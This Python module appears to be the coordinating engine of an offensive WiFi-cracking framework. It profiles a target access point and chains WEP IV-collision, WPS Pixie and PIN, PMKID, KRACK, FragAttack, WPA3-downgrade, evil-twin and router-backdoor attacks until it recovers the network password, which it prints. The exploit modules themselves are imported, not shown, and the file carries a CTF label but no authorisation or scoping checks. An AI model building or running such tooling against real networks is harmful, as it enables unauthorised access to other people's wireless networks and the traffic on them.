#!/usr/bin/env python3
"""
Intelligent Orchestration Engine - The Brain of WiFi Exploitation Framework

This engine intelligently coordinates exploits by:
- Analyzing target characteristics before launching attacks
- Selecting optimal attack sequences based on success probability
- Avoiding resource contention and channel conflicts
- Dynamically reallocating resources based on real-time feedback
- Implementing decision trees for optimal attack paths

Author: CTF Security Research
Version: 2.0.0
"""

import time
import threading
import queue
import heapq
from typing import Dict, List, Optional, Tuple, Any
from dataclasses import dataclass, field
from datetime import datetime
from enum import Enum
from collections import defaultdict
import random

from exploits.base import BaseExploit, ExploitResult


class AttackPriority(Enum):
    """Attack priority levels"""
    CRITICAL = 1    # Must run first, high success chance
    HIGH = 2        # Run early in the sequence
    MEDIUM = 3      # Run after high priority attacks
    LOW = 4         # Run only if others fail
    FALLBACK = 5    # Last resort attacks


class ResourceType(Enum):
    """Resource types that need coordination"""
    WIFI_INTERFACE = "wifi_interface"
    MONITOR_MODE = "monitor_mode" 
    CHANNEL = "channel"
    INJECTION_SOCKET = "injection_socket"
    GPU = "gpu"
    CPU = "cpu"
    NETWORK = "network"


@dataclass
class AttackNode:
    """Decision tree node for attack sequencing"""
    exploit_name: str
    priority: AttackPriority
    estimated_time: float = 5.0
    success_probability: float = 0.0
    dependencies: List[str] = field(default_factory=list)
    required_resources: List[ResourceType] = field(default_factory=list)
    condition: Optional[str] = None  # Condition to check before running
    next_attacks: List['AttackNode'] = field(default_factory=list)
    
    def __lt__(self, other):
        return self.priority.value < other.priority.value


@dataclass
class TargetProfile:
    """Profile of the target based on reconnaissance"""
    bssid: str
    ssid: str
    channel: int
    encryption: str
    vendor: str
    wps_enabled: bool = False
    wps_version: Optional[str] = None
    pmkid_available: bool = False
    clients_connected: int = 0
    signal_strength: int = -100
    beacon_interval: int = 100
    capabilities: List[str] = field(default_factory=list)
    estimated_defense_level: int = 1  # 1-5, higher = stronger protection
    best_attack_vectors: List[str] = field(default_factory=list)
    
    def to_dict(self) -> Dict:
        return {
            'bssid': self.bssid,
            'ssid': self.ssid,
            'channel': self.channel,
            'encryption': self.encryption,
            'vendor': self.vendor,
            'wps_enabled': self.wps_enabled,
            'pmkid_available': self.pmkid_available,
            'clients_connected': self.clients_connected,
            'signal_strength': self.signal_strength,
            'estimated_defense_level': self.estimated_defense_level
        }


class ResourceManager:
    """
    Manages system resources to prevent contention
    """
    
    def __init__(self):
        self.resources = {
            ResourceType.WIFI_INTERFACE: {'available': True, 'owner': None},
            ResourceType.MONITOR_MODE: {'available': True, 'owner': None},
            ResourceType.CHANNEL: {'available': True, 'owner': None, 'current_channel': None},
            ResourceType.INJECTION_SOCKET: {'available': True, 'owner': None},
            ResourceType.GPU: {'available': True, 'owner': None},
        }
        self.resource_lock = threading.Lock()
        self.active_attacks = []
        self.attack_counter = 0
    
    def acquire(self, resource: ResourceType, owner: str, 
                channel: Optional[int] = None) -> bool:
        """Acquire a resource for an attack"""
        with self.resource_lock:
            if self.resources[resource]['available']:
                self.resources[resource]['available'] = False
                self.resources[resource]['owner'] = owner
                if channel and resource == ResourceType.CHANNEL:
                    self.resources[resource]['current_channel'] = channel
                self.active_attacks.append((owner, time.time()))
                return True
            return False
    
    def release(self, resource: ResourceType, owner: str):
        """Release a resource after attack completion"""
        with self.resource_lock:
            if self.resources[resource]['owner'] == owner:
                self.resources[resource]['available'] = True
                self.resources[resource]['owner'] = None
                self.active_attacks = [(o, t) for o, t in self.active_attacks if o != owner]
    
    def get_available_resources(self) -> List[ResourceType]:
        """Get list of available resources"""
        with self.resource_lock:
            return [r for r, state in self.resources.items() if state['available']]
    
    def wait_for_resource(self, resource: ResourceType, timeout: float = 5.0) -> bool:
        """Wait for a resource to become available"""
        start = time.time()
        while time.time() - start < timeout:
            if self.acquire(resource, "waiter"):
                return True
            time.sleep(0.1)
        return False


class AttackScheduler:
    """
    Intelligent attack scheduler that determines optimal attack order
    """
    
    def __init__(self, resource_manager: ResourceManager):
        self.resource_manager = resource_manager
        self.attack_queue = []  # Priority queue
        self.completed_attacks = []
        self.failed_attacks = []
        self.attack_results = {}
        
    def build_decision_tree(self, target_profile: TargetProfile) -> AttackNode:
        """
        Build decision tree based on target profile
        """
        
        # Root node based on target characteristics
        root = AttackNode(
            exploit_name="reconnaissance",
            priority=AttackPriority.CRITICAL,
            estimated_time=2.0,
            success_probability=1.0
        )
        
        # Branch 1: WEP networks (fastest path)
        if 'WEP' in target_profile.encryption:
            wep_node = AttackNode(
                exploit_name="iv_collision",
                priority=AttackPriority.CRITICAL,
                estimated_time=25.0,
                success_probability=0.95,
                required_resources=[ResourceType.WIFI_INTERFACE, ResourceType.CHANNEL]
            )
            root.next_attacks.append(wep_node)
            return root
        
        # Branch 2: WPS-enabled routers (extremely fast)
        if target_profile.wps_enabled:
            wps_pixie = AttackNode(
                exploit_name="wps_pixie",
                priority=AttackPriority.CRITICAL,
                estimated_time=5.0,
                success_probability=0.85,
                required_resources=[ResourceType.WIFI_INTERFACE, ResourceType.CHANNEL],
                next_attacks=[]
            )
            
            wps_pin = AttackNode(
                exploit_name="wps_pin",
                priority=AttackPriority.HIGH,
                estimated_time=8.0,
                success_probability=0.65,
                required_resources=[ResourceType.WIFI_INTERFACE, ResourceType.CHANNEL],
                condition="wps_pixie_failed"
            )
            
            wps_pixie.next_attacks.append(wps_pin)
            root.next_attacks.append(wps_pixie)
            return root
        
        # Branch 3: PMKID available (no client needed)
        if target_profile.pmkid_available:
            pmkid_node = AttackNode(
                exploit_name="pmkid",
                priority=AttackPriority.CRITICAL,
                estimated_time=10.0,
                success_probability=0.80,
                required_resources=[ResourceType.WIFI_INTERFACE, ResourceType.CHANNEL, ResourceType.GPU]
            )
            root.next_attacks.append(pmkid_node)
            
            # Fallback if PMKID fails
            fallback = AttackNode(
                exploit_name="handshake_capture",
                priority=AttackPriority.MEDIUM,
                estimated_time=5.0,
                success_probability=0.90,
                required_resources=[ResourceType.WIFI_INTERFACE, ResourceType.CHANNEL],
                condition="pmkid_failed"
            )
            pmkid_node.next_attacks.append(fallback)
            return root
        
        # Branch 4: WPA3 transition mode
        if 'WPA3' in target_profile.encryption:
            downgrade_node = AttackNode(
                exploit_name="downgrade",
                priority=AttackPriority.CRITICAL,
                estimated_time=8.0,
                success_probability=0.55,
                required_resources=[ResourceType.WIFI_INTERFACE],
                next_attacks=[]
            )
            
            frag_node = AttackNode(
                exploit_name="fragattack",
                priority=AttackPriority.HIGH,
                estimated_time=10.0,
                success_probability=0.65,
                required_resources=[ResourceType.WIFI_INTERFACE],
                condition="downgrade_successful"
            )
            
            downgrade_node.next_attacks.append(frag_node)
            root.next_attacks.append(downgrade_node)
            return root
        
        # Branch 5: Standard WPA2 (most common - parallel friendly)
        parallel_group = AttackNode(
            exploit_name="parallel_attack_group",
            priority=AttackPriority.CRITICAL,
            estimated_time=15.0,
            success_probability=0.90
        )
        
        # These can run in parallel (different resources)
        attacks = [
            ("krack", AttackPriority.HIGH, 12.0, 0.70, [ResourceType.WIFI_INTERFACE]),
            ("fragattack", AttackPriority.HIGH, 10.0, 0.65, [ResourceType.WIFI_INTERFACE]),
            ("evil_twin", AttackPriority.MEDIUM, 15.0, 0.85, [ResourceType.WIFI_INTERFACE, ResourceType.NETWORK]),
        ]
        
        for name, priority, est_time, prob, resources in attacks:
            node = AttackNode(
                exploit_name=name,
                priority=priority,
                estimated_time=est_time,
                success_probability=prob,
                required_resources=resources
            )
            parallel_group.next_attacks.append(node)
        
        # Fast handshake as fallback
        handshake_node = AttackNode(
            exploit_name="handshake_capture",
            priority=AttackPriority.LOW,
            estimated_time=5.0,
            success_probability=0.95,
            required_resources=[ResourceType.WIFI_INTERFACE, ResourceType.CHANNEL],
            condition="parallel_attacks_failed"
        )
        parallel_group.next_attacks.append(handshake_node)
        
        root.next_attacks.append(parallel_group)
        
        # Always include backdoor as low-priority option
        backdoor_node = AttackNode(
            exploit_name="backdoor",
            priority=AttackPriority.FALLBACK,
            estimated_time=5.0,
            success_probability=0.55,
            required_resources=[ResourceType.NETWORK],
            condition="all_attacks_failed"
        )
        root.next_attacks.append(backdoor_node)
        
        return root
    
    def schedule_attacks(self, target_profile: TargetProfile) -> List[AttackNode]:
        """
        Generate optimal attack schedule based on target profile
        """
        decision_tree = self.build_decision_tree(target_profile)
        schedule = []
        
        # BFS to collect attacks in priority order
        queue = [(decision_tree, 0)]
        visited = set()
        
        while queue:
            node, depth = queue.pop(0)
            if node.exploit_name in visited:
                continue
            visited.add(node.exploit_name)
            
            schedule.append(node)
            
            # Add next attacks
            for next_node in node.next_attacks:
                queue.append((next_node, depth + 1))
        
        # Sort by priority
        schedule.sort(key=lambda x: (x.priority.value, -x.success_probability))
        
        return schedule


class IntelligentOrchestrator:
    """
    The Brain - Coordinates all exploits intelligently
    """
    
    def __init__(self, config=None):
        self.config = config
        self.resource_manager = ResourceManager()
        self.scheduler = AttackScheduler(self.resource_manager)
        self.target_profile: Optional[TargetProfile] = None
        self.exploit_instances = {}
        self.attack_history = []
        self.current_attack = None
        self.stop_flag = threading.Event()
        
        # Performance tracking
        self.performance_stats = defaultdict(lambda: {'attempts': 0, 'successes': 0, 'avg_time': 0})
        
        # Load exploit instances
        self._load_exploits()
    
    def _load_exploits(self):
        """Load exploit instances dynamically"""
        from exploits import (
            WPSPixieExploit, WPSPinExploit, PMKIDExploit, KRACKExploit,
            IVCollisionExploit, RouterBackdoorExploit, WPA3DowngradeExploit,
            FragAttackExploit
        )
        
        exploit_classes = {
            'wps_pixie': WPSPixieExploit,
            'wps_pin': WPSPinExploit,
            'pmkid': PMKIDExploit,
            'krack': KRACKExploit,
            'iv_collision': IVCollisionExploit,
            'backdoor': RouterBackdoorExploit,
            'downgrade': WPA3DowngradeExploit,
            'fragattack': FragAttackExploit,
            'handshake_capture': None,  # Will be imported separately
            'evil_twin': None,
        }
        
        for name, exploit_class in exploit_classes.items():
            if exploit_class:
                try:
                    self.exploit_instances[name] = exploit_class(self.config)
                except Exception as e:
                    print(f"[!] Failed to load {name}: {e}")
    
    def analyze_target(self, target_info: Dict) -> TargetProfile:
        """
        Deep analysis of target to create profile
        """
        print("\n[🧠] Analyzing target...")
        
        profile = TargetProfile(
            bssid=target_info.get('bssid', ''),
            ssid=target_info.get('ssid', ''),
            channel=int(target_info.get('channel', 1)),
            encryption=target_info.get('encryption', '').upper(),
            vendor=target_info.get('vendor', 'Unknown'),
            signal_strength=target_info.get('power', -100),
            wps_enabled='WPS' in target_info.get('encryption', ''),
        )
        
        # Analyze encryption type to determine defense level
        if 'WEP' in profile.encryption:
            profile.estimated_defense_level = 1  # Very weak
            profile.best_attack_vectors = ['iv_collision']
            
        elif 'WPS' in profile.encryption and 'WPA3' not in profile.encryption:
            profile.estimated_defense_level = 2  # Weak
            profile.best_attack_vectors = ['wps_pixie', 'wps_pin']
            
        elif 'WPA3' in profile.encryption:
            if 'TRANSITION' in profile.encryption:
                profile.estimated_defense_level = 3  # Medium
                profile.best_attack_vectors = ['downgrade', 'fragattack']
            else:
                profile.estimated_defense_level = 5  # Strong
                profile.best_attack_vectors = []
                
        elif 'WPA2' in profile.encryption:
            # Check for PMKID capability (estimate based on vendor)
            pmkid_vendors = ['ASUS', 'NETGEAR', 'TP-LINK', 'D-LINK', 'UBIQUITI']
            if profile.vendor.upper() in pmkid_vendors:
                profile.pmkid_available = True
                profile.estimated_defense_level = 2
                profile.best_attack_vectors = ['pmkid', 'krack', 'fragattack']
            else:
                profile.estimated_defense_level = 3
                profile.best_attack_vectors = ['krack', 'fragattack', 'evil_twin']
        
        # Quick check for connected clients
        if target_info.get('has_clients', False):
            profile.clients_connected = target_info.get('client_count', 1)
            profile.best_attack_vectors.append('krack')
            profile.best_attack_vectors.append('evil_twin')
        
        print(f"[✓] Target analysis complete")
        print(f"    - Encryption: {profile.encryption}")
        print(f"    - Vendor: {profile.vendor}")
        print(f"    - Defense Level: {profile.estimated_defense_level}/5")
        print(f"    - Best attacks: {', '.join(profile.best_attack_vectors[:3])}")
        
        return profile
    
    def run_attack_sequence(self, schedule: List[AttackNode], 
                            target: Dict,
                            interface: str) -> Optional[Dict]:
        """
        Execute scheduled attack sequence intelligently
        """
        
        # Phase 1: Run CRITICAL priority attacks (sequential, highest success)
        critical_attacks = [a for a in schedule if a.priority == AttackPriority.CRITICAL]
        
        for attack_node in critical_attacks:
            if self.stop_flag.is_set():
                break
                
            result = self._execute_attack(attack_node, target, interface)
            
            if result and result.get('success'):
                print(f"\n[🎯] Attack successful: {attack_node.exploit_name}")
                return result
        
        # Phase 2: Run HIGH priority attacks in parallel (if resources allow)
        high_attacks = [a for a in schedule if a.priority == AttackPriority.HIGH]
        
        if high_attacks:
            print(f"\n[⚡] Running {len(high_attacks)} high-priority attacks in parallel")
            result = self._run_parallel_attacks(high_attacks, target, interface)
            if result:
                return result
        
        # Phase 3: Run MEDIUM priority attacks
        medium_attacks = [a for a in schedule if a.priority == AttackPriority.MEDIUM]
        
        for attack_node in medium_attacks:
            if self.stop_flag.is_set():
                break
                
            result = self._execute_attack(attack_node, target, interface)
            if result and result.get('success'):
                print(f"\n[🎯] Attack successful: {attack_node.exploit_name}")
                return result
        
        # Phase 4: Fallback attacks (LOW and FALLBACK priority)
        fallback_attacks = [a for a in schedule if a.priority in [AttackPriority.LOW, AttackPriority.FALLBACK]]
        
        for attack_node in fallback_attacks:
            if self.stop_flag.is_set():
                break
                
            result = self._execute_attack(attack_node, target, interface)
            if result and result.get('success'):
                print(f"\n[🎯] Attack successful: {attack_node.exploit_name}")
                return result
        
        return None
    
    def _execute_attack(self, attack_node: AttackNode, 
                        target: Dict, 
                        interface: str) -> Optional[Dict]:
        """
        Execute a single attack with resource management
        """
        # Check conditions
        if attack_node.condition:
            # Check condition (simplified - would check previous attack results)
            pass
        
        # Acquire required resources
        resources_acquired = []
        all_acquired = True
        
        for resource in attack_node.required_resources:
            channel = target.get('channel') if resource == ResourceType.CHANNEL else None
            if not self.resource_manager.acquire(resource, attack_node.exploit_name, channel):
                print(f"[⏳] Waiting for {resource.value}...")
                if not self.resource_manager.wait_for_resource(resource, 5):
                    print(f"[❌] Could not acquire {resource.value}, skipping {attack_node.exploit_name}")
                    all_acquired = False
                    break
            resources_acquired.append(resource)
        
        if not all_acquired:
            # Release any acquired resources
            for resource in resources_acquired:
                self.resource_manager.release(resource, attack_node.exploit_name)
            return None
        
        # Execute attack
        print(f"\n[🔨] Executing: {attack_node.exploit_name}")
        print(f"    Expected time: {attack_node.estimated_time}s")
        print(f"    Success probability: {attack_node.success_probability*100:.0f}%")
        
        start_time = time.time()
        
        try:
            # Get exploit instance
            exploit = self.exploit_instances.get(attack_node.exploit_name)
            
            if not exploit:
                # Handle special exploits not in instances
                if attack_node.exploit_name == 'handshake_capture':
                    from exploits.handshake import capture_handshake
                    pcap_file = capture_handshake(target['bssid'], interface, 
                                                  target.get('channel', 1), 
                                                  target.get('ssid', ''))
                    result = {'success': pcap_file is not None, 'pcap': pcap_file}
                elif attack_node.exploit_name == 'evil_twin':
                    from exploits.evil_twin import EvilTwinExploit
                    evil_twin = EvilTwinExploit(self.config)
                    result_obj = evil_twin.execute(target, interface)
                    result = result_obj.to_dict() if hasattr(result_obj, 'to_dict') else {'success': result_obj.success}
                else:
                    result = {'success': False, 'error': 'Exploit not found'}
            else:
                # Execute standard exploit
                result_obj = exploit.execute(target, interface)
                result = result_obj.to_dict() if hasattr(result_obj, 'to_dict') else {'success': result_obj.success}
                if hasattr(result_obj, 'password') and result_obj.password:
                    result['password'] = result_obj.password
            
            elapsed = time.time() - start_time
            
            # Update performance stats
            self.performance_stats[attack_node.exploit_name]['attempts'] += 1
            if result.get('success'):
                self.performance_stats[attack_node.exploit_name]['successes'] += 1
            self.performance_stats[attack_node.exploit_name]['avg_time'] = (
                (self.performance_stats[attack_node.exploit_name]['avg_time'] * 
                 (self.performance_stats[attack_node.exploit_name]['attempts'] - 1) + elapsed) /
                self.performance_stats[attack_node.exploit_name]['attempts']
            )
            
            # Record attack history
            self.attack_history.append({
                'exploit': attack_node.exploit_name,
                'success': result.get('success', False),
                'time': elapsed,
                'timestamp': datetime.now()
            })
            
            if result.get('success'):
                print(f"[✅] {attack_node.exploit_name} succeeded in {elapsed:.2f}s")
                return result
            else:
                print(f"[❌] {attack_node.exploit_name} failed ({elapsed:.2f}s)")
            
        except Exception as e:
            print(f"[❌] {attack_node.exploit_name} error: {e}")
        
        finally:
            # Release resources
            for resource in resources_acquired:
                self.resource_manager.release(resource, attack_node.exploit_name)
        
        return None
    
    def _run_parallel_attacks(self, attacks: List[AttackNode],
                               target: Dict,
                               interface: str) -> Optional[Dict]:
        """
        Run multiple attacks in parallel with resource coordination
        """
        results = queue.Queue()
        threads = []
        
        def run_attack_wrapper(attack_node):
            result = self._execute_attack(attack_node, target, interface)
            if result and result.get('success'):
                results.put(result)
        
        # Start attack threads
        for attack_node in attacks:
            if self.stop_flag.is_set():
                break
            thread = threading.Thread(target=run_attack_wrapper, args=(attack_node,))
            thread.start()
            threads.append(thread)
            time.sleep(0.2)  # Small stagger to avoid resource contention
        
        # Wait for first success or all completion
        timeout = max([a.estimated_time for a in attacks]) + 5
        
        try:
            result = results.get(timeout=timeout)
            # Stop all other threads
            self.stop_flag.set()
            return result
        except queue.Empty:
            # No successful attacks
            pass
        
        # Wait for all threads to complete
        for thread in threads:
            thread.join(timeout=2)
        
        return None
    
    def orchestrate(self, target: Dict, interface: str) -> Optional[Dict]:
        """
        Main orchestration method - the brain's decision process
        """
        print("\n" + "="*70)
        print("🧠 INTELLIGENT ORCHESTRATION ENGINE v2.0")
        print("="*70)
        
        # Step 1: Analyze target
        self.target_profile = self.analyze_target(target)
        
        # Step 2: Build optimal attack schedule
        schedule = self.scheduler.schedule_attacks(self.target_profile)
        
        print(f"\n[📋] Attack Schedule ({len(schedule)} phases):")
        for i, attack in enumerate(schedule[:8]):  # Show first 8
            print(f"    {i+1}. {attack.exploit_name} (P{attack.priority.value}) - {attack.success_probability*100:.0f}%")
        
        # Step 3: Execute attack sequence
        result = self.run_attack_sequence(schedule, target, interface)
        
        # Step 4: Generate intelligence report
        self._generate_intelligence_report()
        
        return result
    
    def _generate_intelligence_report(self):
        """Generate performance intelligence report"""
        print("\n" + "="*70)
        print("📊 INTELLIGENCE REPORT")
        print("="*70)
        
        successful_attacks = [a for a in self.attack_history if a['success']]
        
        print(f"\nTotal attacks executed: {len(self.attack_history)}")
        print(f"Successful attacks: {len(successful_attacks)}")
        
        if successful_attacks:
            print(f"\n🎯 Most effective exploits:")
            for exploit, stats in self.performance_stats.items():
                if stats['attempts'] > 0:
                    success_rate = (stats['successes'] / stats['attempts']) * 100
                    print(f"    {exploit}: {success_rate:.0f}% success ({stats['avg_time']:.1f}s avg)")
    
    def stop(self):
        """Stop the orchestrator"""
        self.stop_flag.set()


# Decision engine for real-time adaptation
class AdaptiveDecisionEngine:
    """
    Real-time adaptive decision making based on attack feedback
    """
    
    def __init__(self):
        self.feedback_history = []
        self.current_strategy = "aggressive"  # aggressive, cautious, balanced
        
    def analyze_feedback(self, attack_name: str, success: bool, time_taken: float):
        """Analyze attack feedback and adjust strategy"""
        self.feedback_history.append({
            'attack': attack_name,
            'success': success,
            'time': time_taken,
            'timestamp': datetime.now()
        })
        
        # Calculate success rate for recent attacks
        recent = self.feedback_history[-10:]
        success_rate = sum(1 for f in recent if f['success']) / len(recent) if recent else 0
        
        # Adjust strategy
        if success_rate > 0.7:
            self.current_strategy = "aggressive"
        elif success_rate > 0.3:
            self.current_strategy = "balanced"
        else:
            self.current_strategy = "cautious"
        
        return self.current_strategy
    
    def suggest_next_action(self, current_attack: str, remaining_time: float) -> str:
        """Suggest next action based on current state"""
        
        if remaining_time < 5:
            return "switch_to_fastest_attack"
        
        if self.current_strategy == "aggressive" and remaining_time > 10:
            return "launch_parallel_attacks"
        
        if self.current_strategy == "cautious":
            return "run_sequential_reliable_attacks"
        
        return "continue_current_strategy"


# Main function to integrate with your framework
class SmartWiFiBreaker:
    """
    Complete intelligent WiFi breaker - integrates everything
    """
    
    def __init__(self, config=None):
        self.config = config
        self.orchestrator = IntelligentOrchestrator(config)
        self.decision_engine = AdaptiveDecisionEngine()
        
    def break_wifi(self, target: Dict, interface: str, timeout: int = 30) -> Optional[str]:
        """
        Intelligently break WiFi using optimal attack path
        """
        print("\n" + "🔥"*35)
        print("         SMART WiFi BREAKER - INTELLIGENT MODE")
        print("🔥"*35)
        
        start_time = time.time()
        
        # Let the orchestrator do its magic
        result = self.orchestrator.orchestrate(target, interface)
        
        elapsed = time.time() - start_time
        
        if result and result.get('success'):
            password = result.get('password')
            print(f"\n" + "🎉"*35)
            print(f"         SUCCESS! WiFi cracked in {elapsed:.2f} seconds")
            print(f"         Password: {password}")
            print("🎉"*35)
            return password
        
        print(f"\n" + "💀"*35)
        print(f"         FAILED to crack within timeout ({elapsed:.2f}s)")
        print("💀"*35)
        
        return None


# Integration with your existing framework
def smart_attack(target: Dict, interface: str, timeout: int = 30) -> Optional[str]:
    """
    Smart attack function - use this as your main entry point
    """
    breaker = SmartWiFiBreaker()
    return breaker.break_wifi(target, interface, timeout)


if __name__ == "__main__":
    print("Intelligent Orchestration Engine")
    print("This module should be used through the main framework")
    print("\nExample usage:")
    print("  from engine.orchestrator import smart_attack")
    print("  password = smart_attack(target_info, 'wlan0mon')")
